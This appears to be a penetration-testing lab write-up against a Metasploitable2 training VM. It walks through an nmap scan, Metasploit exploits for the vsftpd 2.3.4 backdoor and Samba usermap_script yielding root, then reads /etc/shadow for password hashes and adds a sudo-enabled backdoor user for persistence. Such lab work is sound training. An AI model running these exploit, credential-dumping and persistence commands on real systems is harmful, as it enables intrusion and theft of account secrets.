


# Enumeration 


## Objective 

### This lab practices tends to help us understand how to enumerate a system as being a penetration tester. 

### Learning Resources 

- IppSec Enumeration Walkthrough
- HackTricks methodology References

###  Key Takeways:
> Consider enumeration more deeply than exploiting the system.


### Nmap Full Scan 

```bash
nmap -sV -sC -O -v -o nmap_scan_output.txt 192.168.56.10
```

### Discovered major services:
- Ftp(vsfpd 2.3.4)
- ssh
- telnet
- smtp
- http (apache)
- samba
- mysql
- postgresql
- tomcat 
- nfs
- vnc 
- irc


Metasploitable2 exposes many vulnerable services for training, which provides hands on experience for learners to exploit on numerous ways. 



## FTP Exploitation Attempt

__Target Service__
> vsfpd 2.3.4 backdoor (decoy)

Metasploit module:

```bash
	 msfconsole 
	use exploit/unix/ftp/vsfpd_234_backdoor
	set RHOSTS 192.168.56.10
	exploit
```


Result:
- Root shell achieved once
- Subsequent attempts failed
- Anonymous ftp login showed, it was allowed but not useful

### Learned
> Exploits can be unstable. Always pivot to other attack surfaces. 





## Samba Exploitation (True Success)

__Target Service__
samba 3.0.20
Metasploit exploit:

```bash
	msfconsole
	use exploit/multi/samba/usermap_script
	set RHOSTS 192.168.56.10
	set RPORT 445
	exploit
```

Result:
- Root shell obtain
- Full access to the victim machine

# Verification

```bash
	whoami
	root
```



## Post-Exploitation



# After gaining root:
Directory exploration:

```bash
	ls /
	ls /var
	ls /home
	ls /root
```


# Discovered:
- Web Application Directories (TikiWiki)
- MySQL server files
- Certificate and keys files
- Vulnerable services directories



## Credential Harvesting 

# Dumped Password Hashes:

```bash
cat /etc/shadow
```


Found multiple user accounts including :
- root 
- msfadmin
- postgres
- service
- user

It shows the compromises of the system.




## Permission Simulation

 __Created a backdoor user:__

```bash
	useradd ghost
	passwd ********
	usermod -aG sudo ghost
```

This simulates attacker persistence techniques.


[Python Script](auto_enumeration.py)


__Purpose__

- Automate Nmap Scan
- Save Results for later analysis
- Speed up reconnaissance workflow


__Skills Practices__

- Network Troubleshooting & Nmap enumeration
- Service Fingerprinting + Exploit Research
- Linux Privilege understanding 
- Post-Exploitation workflow
- Credential Dumping & Scripting

